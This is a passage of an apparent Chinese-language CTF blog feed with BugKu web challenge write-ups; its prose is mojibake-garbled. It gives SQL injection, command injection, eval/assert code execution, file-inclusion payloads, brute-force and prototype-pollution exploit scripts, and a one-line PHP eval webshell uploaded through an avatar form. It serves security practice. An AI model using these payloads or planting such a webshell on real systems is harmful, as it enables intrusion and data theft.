class="line"><span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;nnff401s86pvr720ouq5qe0k40&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">uname = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;uname&#x27;</span>:uname,</span><br><span class="line"><span class="string">&#x27;passwd&#x27;</span>:<span class="string">&#x27;123123&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">length = len_of_passwd(url,data,cookie,uname)</span><br><span class="line">get_passwd(url,data,cookie,uname,length)</span><br><span class="line"><span class="comment">#bukuctf:4dcc88f8f1bc05e7c2ad1a60288481a2</span></span><br></pre></td></tr></table></figure><p>ç™»é™†åè¾“å…¥å‘½ä»¤<code>&#123;cat,/flag&#125;</code>å³å¯è·å¾—flag</p><blockquote><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/qq_41696858/article/details/119081156">BugKu-Web-wp3</a></p></blockquote><h2 id="login2"><a href="#login2" class="headerlink" title="login2"></a>login2</h2><p>ç”¨burpæŠ“åŒ…å‘ç°æœ‰tipå­—æ®µ,base64è§£ç å³å¯å¾—åˆ°æç¤º</p><p><img src="https://s2.loli.net/2022/05/05/hHV4OeurRwjZ1vM.png" alt="login2_1.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT username,password FROM admin WHERE username=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$row</span>) &amp;&amp; <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>]===<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ„é€ <code>username=admin&#39; union select 1,md5(123)#   </code>å’Œ<code>password=123</code>å³å¯åˆ›å»ºä¸€ä¸ªä¸å­˜åœ¨çš„ç”¨æˆ·é€šè¿‡éªŒè¯ï¼Œè¿›å…¥åä½¿ç”¨å‘½ä»¤<code>123| cat /flag &gt; test</code>ï¼Œç„¶åè¿›å…¥ç½‘å€<code>http://114.67.175.224:15394/test</code>å³å¯è·å¾—flagã€‚</p><p><img src="https://s2.loli.net/2022/05/05/wByZDhxQitfTlrg.png" alt="login2_2.png"></p><blockquote><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/weixin_58111246/article/details/123482301">Bugku-Web-wp4</a></p><p>è¿˜æœ‰åå¼¹shellçš„åšæ³•ï¼š<a href="https://www.jianshu.com/p/4f8d8d8b7b31">https://www.jianshu.com/p/4f8d8d8b7b31</a></p></blockquote><h2 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h2><p>ç›²çŒœè´¦å·<code>admin</code>å’Œå¯†ç <code>bugkuctf</code>ï¼Œç„¶åç›´æ¥æ‹¿åˆ°äº†flagã€‚</p><blockquote><p>å¤§ä½¬çš„æ³¨å…¥è¿‡ç¨‹ï¼š<a href="https://blog.csdn.net/plant1234/article/details/118033711">sqlæ³¨å…¥</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> BugKu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugKu Web åˆ·é¢˜è®°å½•3</title>
      <link href="/2022/04/27/BugKu-Web3/"/>
      <url>/2022/04/27/BugKu-Web3/</url>
      
        <content type="html"><![CDATA[<h1 id="BugKu-Web-åˆ·é¢˜è®°å½•3"><a href="#BugKu-Web-åˆ·é¢˜è®°å½•3" class="headerlink" title="BugKu Web åˆ·é¢˜è®°å½•3"></a>BugKu Web åˆ·é¢˜è®°å½•3</h1><blockquote><p>å‚è€ƒï¼š</p><p><a href="https://www.php.net/exec">PHPç¨‹åºæ‰§è¡Œ</a></p><p><a href="https://zhuanlan.zhihu.com/p/401583380">BugKu-Web-wp1</a></p><p><a href="https://blog.csdn.net/weixin_58111246/article/details/123971455?spm=1001.2014.3001.5501">BugKu-Web-wp2</a></p><p><a href="https://www.jianshu.com/p/2dbb1b38de1e">BugKu-Web-wp3</a></p></blockquote><h2 id="game1"><a href="#game1" class="headerlink" title="game1"></a>game1</h2><p>ä¸€å±€æ¸¸æˆç»“æŸåï¼Œå‘ç°æŠ“åˆ°äº†ä¸€ä¸ªå¯ç–‘çš„æ•°æ®åŒ…</p><p><img src="https://s2.loli.net/2022/04/27/qpcmtIiEDoKwRuM.png" alt="game1_1.png"></p><p>çŒœæµ‹signå­—æ®µæ˜¯base64åŠ å¯†çš„ï¼Œä½†è§£ç åå‘ç°æ˜¯æ— ç”¨å­—ç¬¦ï¼Œåˆå¯¹scoreå­—æ®µå°è¯•base64åŠ å¯†ï¼Œå‘ç°25çš„base64ç æ˜¯<code>MjU=</code>ï¼Œæ•…çŒœæµ‹signå­—æ®µæœ¬è´¨ä¸Šæ˜¯ä¸æ˜¯<code>&#39;zM&#39;+&#39;base64_encode(score)&#39;+&#39;==&#39;</code>è¿™æ ·ç»„æˆçš„ï¼Œå‘é€åå‘ç°ç¡®å®å¯ä»¥å¾—åˆ°flag</p><p><img src="https://s2.loli.net/2022/04/27/c5I9fRCyYVqFkwi.png" alt="game1_2.png"></p><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><h3 id="æ–¹æ³•1"><a href="#æ–¹æ³•1" class="headerlink" title="æ–¹æ³•1"></a>æ–¹æ³•1</h3><p>å…ˆè¯•è¯•ä¼ å…¥å…¨å±€å˜é‡çœ‹çœ‹å…¶ä¸­å†…å®¹</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:13624/?hello=$GLOBALS</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/3mGOYDJhBH8264i.png" alt="eval1.png"></p><p>å¾ˆå¥½ï¼Œè¢«å˜²è®½äº†ã€‚evalä¼šæ‰§è¡Œä¼ å…¥å­—ç¬¦ä¸²ï¼Œæ•…æ„é€ payloadè®©å…¶æ‰§è¡Œå‘½ä»¤</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:13624/?hello=);show_source(&#x27;flag.php&#x27;);var_dump(</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/4u1rN5TXjQaVF63.png" alt="eval2.png"></p><h3 id="æ–¹æ³•2"><a href="#æ–¹æ³•2" class="headerlink" title="æ–¹æ³•2"></a>æ–¹æ³•2</h3><p>ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨file</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:13624/?hello=file(&#x27;flag.php&#x27;)</span><br></pre></td></tr></table></figure><h2 id="source"><a href="#source" class="headerlink" title="source"></a>source</h2><p>æ‰«æå‘ç°æœ‰gitæ–‡ä»¶æ³„éœ²ï¼Œæ•…ä¸‹è½½gitæ–‡ä»¶ï¼ˆlinuxä¸‹ï¼‰</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">wget</span> -r http://114.67.175.224:19331/.git</span><br></pre></td></tr></table></figure><p>è¿›å…¥æ—¥å¿—ç›®å½•ä¸‹</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">cd</span> <span class="number">114.67.175.224:19331</span>/.git/logs</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ä¿¡æ¯</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">git</span> reflog</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/9iGlevcpH3gEZjJ.png" alt="source1.png"></p><p>ä½¿ç”¨git showå‘½ä»¤æŸ¥çœ‹æ–‡ä»¶ï¼Œæœ€ç»ˆåœ¨40c6d51æ–‡ä»¶é‡Œæ‰¾åˆ°flag</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">git</span> show 40c6d51</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/jXeQsLpJgoF5ril.png" alt="source2.png"></p><h2 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h2><h3 id="æ–¹æ³•1-1"><a href="#æ–¹æ³•1-1" class="headerlink" title="æ–¹æ³•1"></a>æ–¹æ³•1</h3><p>å°è¯•æŸ¥çœ‹æºç </p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:10060/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><p>base64è§£ç åè·å¾—æºç å’Œflag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;Bugku-web&lt;/title&gt;</span><br><span class="line">    </span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!$_GET[file])&#123;echo &#x27;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&#x27;;&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">echo &quot;Oh no!&quot;;</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">include($file); </span><br><span class="line">//flag:flag&#123;ee54957897543831f6aa21d30f46913d&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•2-1"><a href="#æ–¹æ³•2-1" class="headerlink" title="æ–¹æ³•2"></a>æ–¹æ³•2</h3><p>ä¹Ÿå¯ä»¥ç›´æ¥æ„é€ è¯¥payloadè·å¾—flag</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:10060/index.php?file=//flag</span><br></pre></td></tr></table></figure><h2 id="å¥½åƒéœ€è¦å¯†ç "><a href="#å¥½åƒéœ€è¦å¯†ç " class="headerlink" title="å¥½åƒéœ€è¦å¯†ç "></a>å¥½åƒéœ€è¦å¯†ç </h2><p>ç›´æ¥5ä½çº¯æ•°å­—çˆ†ç ´ï¼ˆå¯†ç æ˜¯12468)ï¼Œexpå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">lens = <span class="number">5</span></span><br><span class="line"><span class="keyword">for</span> password <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100000</span>):</span><br><span class="line">password = <span class="built_in">str</span>(password)</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(password)&lt;lens):</span><br><span class="line">diff = lens-<span class="built_in">len</span>(password)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(diff):</span><br><span class="line">password = <span class="string">&#x27;0&#x27;</span> + password</span><br><span class="line">test = requests.post(<span class="string">&#x27;http://114.67.175.224:15735/&#x27;</span>,data=&#123;<span class="string">&#x27;pwd&#x27;</span>: password&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;å½“å‰æµ‹è¯•çš„å¯†ç ä¸ºï¼š&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(password)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> test.text:</span><br><span class="line">flag = re.findall(<span class="string">&quot;flag\&#123;(.*)?\&#125;&quot;</span>,test.text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]æ­£ç¡®çš„å¯†ç ä¸ºï¼š&#x27;</span>,password)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[*]flag&#123;&#x27;</span>+flag[<span class="number">0</span>]+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/3dtQCz5cogAI9F4.png" alt="password.png"></p><h2 id="No-one-knows-regex-better-than-me"><a href="#No-one-knows-regex-better-than-me" class="headerlink" title="No one knows regex better than me"></a>No one knows regex better than me</h2><p>æ‰“å¼€ç½‘é¡µå³å¯è·å¾—æºç ï¼Œæœ¬åœ°åˆ†ææºç æµ‹è¯•å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$zero</span> = <span class="string">&quot;\\ZmxhZw==&quot;</span>; <span class="comment">//&#x27;ZmxhZw==&#x27;æ˜¯flagçš„base64ç¼–ç </span></span><br><span class="line"><span class="variable">$first</span>=<span class="string">&quot;ag/\\|.php&quot;</span>;</span><br><span class="line"><span class="variable">$second</span>=<span class="variable">$zero</span>.<span class="variable">$first</span>;</span><br><span class="line"><span class="comment">// echo $second;</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/Yeedo|wants|a|girl|friend|or|a|flag/i&quot;</span>,<span class="variable">$second</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[1]&quot;</span>;</span><br><span class="line">    <span class="variable">$key</span>=<span class="variable">$second</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\.\.|flag/&quot;</span>,<span class="variable">$key</span>))&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Noooood hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[2]&quot;</span>;</span><br><span class="line">        <span class="variable">$third</span>=<span class="variable">$first</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\|\056\160\150\x70/i&quot;</span>,<span class="variable">$third</span>))&#123; <span class="comment">// |.php</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[3]&quot;</span>;</span><br><span class="line">            <span class="variable">$end</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$third</span>,<span class="number">5</span>);</span><br><span class="line">            <span class="comment">// echo $zero;</span></span><br><span class="line">            <span class="comment">// echo $end;</span></span><br><span class="line">            <span class="comment">// highlight_file(base64_decode($zero).$end);//maybe flag in flag.php</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$zero</span>).<span class="variable">$end</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;fail!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å†™è„šæœ¬æäº¤å³å¯ï¼Œexpå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://114.67.175.224:17373/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;zero&#x27;</span>:<span class="string">&quot;\\ZmxhZw==&quot;</span>, <span class="comment">#ZmxhZw==</span></span><br><span class="line"><span class="string">&#x27;first&#x27;</span>:<span class="string">&quot;ag/\\|.php&quot;</span> <span class="comment">#aaaa|.php</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url=url,data=data);</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/V5Yd92Ri3HZNUvW.png" alt="better_re.png"></p><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>å…ˆæŸ¥çœ‹æç¤ºï¼Œåˆ†æåå¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$poc</span> = <span class="string">&quot;a#s#s#e#r#t&quot;</span>;</span><br><span class="line"><span class="variable">$poc_1</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;#&quot;</span>,<span class="variable">$poc</span>);</span><br><span class="line"><span class="comment">//print_r($poc_1);</span></span><br><span class="line"><span class="variable">$poc_2</span>=<span class="variable">$poc_1</span>[<span class="number">0</span>].<span class="variable">$poc_1</span>[<span class="number">1</span>].<span class="variable">$poc_1</span>[<span class="number">2</span>].<span class="variable">$poc_1</span>[<span class="number">3</span>].<span class="variable">$poc_1</span>[<span class="number">4</span>].<span class="variable">$poc_1</span>[<span class="number">5</span>];</span><br><span class="line"><span class="comment">//print_r($poc_2);</span></span><br><span class="line"><span class="variable">$poc_2</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>]); <span class="comment">//assert($_GET[&#x27;s&#x27;])</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å‘ç°ä¼ å…¥så³å¯ï¼Œæ•…æ„é€ payloadï¼Œå…ˆæ‰§è¡Œlså‘½ä»¤æŸ¥çœ‹æœ‰å“ªäº›æ–‡ä»¶</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:11841/?s=system(%27ls%27)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/esdpv8BWliSRng4.png" alt="shell1.png"></p><p>æŸ¥çœ‹è¯¥txtæ–‡ä»¶å³å¯è·å¾—flag</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:11841/?s=system(%27cat%20flaga15808abee46a1d5.txt%27)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/8DhOGmWrz93K6wd.png" alt="shell2.png"></p><h2 id="èªæ˜çš„php"><a href="#èªæ˜çš„php" class="headerlink" title="èªæ˜çš„php"></a>èªæ˜çš„php</h2><p>éšæ„ä¼ å‚å¾—åˆ°æºç æç¤º</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;./libs/Smarty.class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;pass a parameter and maybe the flag file&#x27;s filename is random :&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$smarty</span> = <span class="keyword">new</span> <span class="title class_">Smarty</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> AS <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$key</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|\/flag/i&quot;</span>, <span class="variable">$value</span>))&#123;          </span><br><span class="line">            <span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;./template.html&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|readfile|gz|exec|eval|cat|assert|file|fgets/i&quot;</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line">            <span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;./template.html&#x27;</span>);                 </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&quot;eval:&quot;</span>.<span class="variable">$value</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°systemç­‰å‘½ä»¤å·²ç»è¢«ç¦ç”¨äº†ï¼Œæ•…ä½¿ç”¨passthruæ¥æ‰§è¡Œå‘½ä»¤</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:15783/index.php?a=&#123;passthru(%27ls%20-al%20/%27)&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/wRp7dIuoJKUT8AE.png" alt="php1.png"></p><p>å‘ç°ä¸€ä¸ªå¾ˆå¯ç–‘æ–‡ä»¶ï¼Œå»è¯»å–å³å¯è·å¾—flag</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:15783/index.php?a=&#123;passthru(%27tac%20/_7782%27)&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/NYuIkAJXHZKewjq.png" alt="php2.png"></p><blockquote><p>æœ‰å…³ç¨‹åºæ‰§è¡Œå¯çœ‹æ­¤ç½‘ç«™ï¼š<a href="https://www.php.net/exec">PHPç¨‹åºæ‰§è¡Œ</a></p><p>å‚è€ƒwpï¼š<a href="https://zhuanlan.zhihu.com/p/401583380">BugKu-Web-wp1</a></p></blockquote><h2 id="xxxäºŒæ‰‹äº¤æ˜“å¸‚åœº"><a href="#xxxäºŒæ‰‹äº¤æ˜“å¸‚åœº" class="headerlink" title="xxxäºŒæ‰‹äº¤æ˜“å¸‚åœº"></a>xxxäºŒæ‰‹äº¤æ˜“å¸‚åœº</h2><p>çœ‹äº†ä¸€åœˆå‘ç°æ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œæ³¨å†Œè´¦å·ç™»å½•ï¼Œå‘ç°å¯ä»¥ä¸Šä¼ å¤´ï¼Œæ•…è¿›è¡Œå›¾ç‰‡ä¸Šä¼ å¹¶æŠ“åŒ…ï¼Œå‘ç°å›¾ç‰‡æ˜¯ç”¨base64ç¼–ç çš„ï¼Œæ•…æ„é€ ä¸€å¥è¯æœ¨é©¬ä¼ è¿›å»ï¼ˆæ³¨æ„ä½¿ç”¨base64ç¼–ç ï¼Œä¸”å‰é¢çš„jpegè¦æ”¹ä¸ºphpï¼‰</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/m6kYFzCrnJpso98.png" alt="xxxx1.png"></p><p>ç”¨ä¸­å›½èšå‰‘è¿æ¥ä¼ å…¥phpæ–‡ä»¶åœ°å€ï¼ˆå¯†ç ä¸ºcmdï¼‰ï¼Œç¿»æ‰¾åè·å¾—flagã€‚</p><p><img src="https://s2.loli.net/2022/04/27/zIYa4Xc39OCHf7L.png" alt="xxxx2.png"></p><h2 id="é—ªç”µåå…­é­"><a href="#é—ªç”µåå…­é­" class="headerlink" title="é—ªç”µåå…­é­"></a>é—ªç”µåå…­é­</h2><p>æ‰“å¼€ç½‘é¡µå³å¯è·å¾—æºç ï¼Œåˆ†æåæ„é€ payloadå³å¯è·å¾—flag</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:17903/?flag=$a=%27flaa%27;$a&#123;3&#125;=%27g%27;?%3E%3C?=$$a;?%3Ebbbbbbbbbbbbbbbbbb</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/zra8M3yHTnWsIeo.png" alt="teacherma.png"></p><blockquote><p>å‚è€ƒwpï¼š<a href="https://blog.csdn.net/weixin_58111246/article/details/123971455?spm=1001.2014.3001.5501">BugKu-Web-wp2</a></p></blockquote><h2 id="sodirty"><a href="#sodirty" class="headerlink" title="sodirty"></a>sodirty</h2><p>ç”¨å¾¡å‰‘æ‰«ä¸€éå‘ç°<code>www.zip</code></p><p><img src="https://s2.loli.net/2022/04/27/Iv5dpC3bAocHKXt.png" alt="dirty1.png"></p><p>è§£å‹åï¼Œé‡ç‚¹çœ‹routesä¸‹çš„index.jsæ–‡ä»¶ï¼Œå…¶ä¸­ï¼Œgetflagæ˜¯æˆ‘ä»¬è·å–flagçš„åœ°æ–¹</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&quot;/getflag&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">password</span> === <span class="literal">undefined</span> || req.<span class="property">body</span>.<span class="property">password</span> === req.<span class="property">session</span>.<span class="property">challenger</span>.<span class="property">password</span>)&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;ç™»å½•å¤±è´¥&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">challenger</span>.<span class="property">age</span> &gt; <span class="number">79</span>)&#123;  <span class="comment">//  age&lt;=79</span></span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;ç³Ÿè€å¤´å­åæ»´å¾ˆ&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> key = req.<span class="property">body</span>.<span class="property">key</span>.<span class="title function_">toString</span>();</span><br><span class="line">        <span class="keyword">let</span> password = req.<span class="property">body</span>.<span class="property">password</span>.<span class="title function_">toString</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="title class_">Admin</span>[key] === password)&#123;</span><br><span class="line">            res.<span class="title function_">send</span>(process.<span class="property">env</span>.<span class="property">flag</span> ? process.<span class="property">env</span>.<span class="property">flag</span> : <span class="string">&quot;flag&#123;test&#125;&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;å¯†ç é”™è¯¯ï¼Œè¯·ä½¿ç”¨ç®¡ç†å‘˜ç”¨æˆ·åç™»å½•.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>updateå¯ä»¥æ›´æ–°é”®å€¼å¯¹ï¼Œæ˜¯æˆ‘ä»¬ä¸»è¦è¦åˆ©ç”¨çš„å‡½æ•°</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&quot;/update&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">challenger</span> === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/reg&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">attrkey</span> === <span class="literal">undefined</span> || req.<span class="property">body</span>.<span class="property">attrval</span> === <span class="literal">undefined</span>) &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;ä¼ å‚æœ‰è¯¯&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> key = req.<span class="property">body</span>.<span class="property">attrkey</span>.<span class="title function_">toString</span>();</span><br><span class="line">            <span class="keyword">let</span> value = req.<span class="property">body</span>.<span class="property">attrval</span>.<span class="title function_">toString</span>();</span><br><span class="line">            <span class="title function_">setFn</span>(req.<span class="property">session</span>.<span class="property">challenger</span>, key, value);</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;ä¿®æ”¹æˆåŠŸ&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>æ•…æ„é€ expå¦‚ä¸‹å³å¯è·å¾—flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = requests.session()  <span class="comment">#è¦ä¿æŒåŒä¸€ä¼šè¯</span></span><br><span class="line">url = <span class="string">&quot;http://114.67.175.224:19460&quot;</span></span><br><span class="line">reg = s.get(url+<span class="string">&#x27;/reg&#x27;</span>)</span><br><span class="line"><span class="comment"># print(reg.text)</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;attrkey&#x27;</span>:<span class="string">&#x27;age&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;attrval&#x27;</span>:<span class="number">79</span></span><br><span 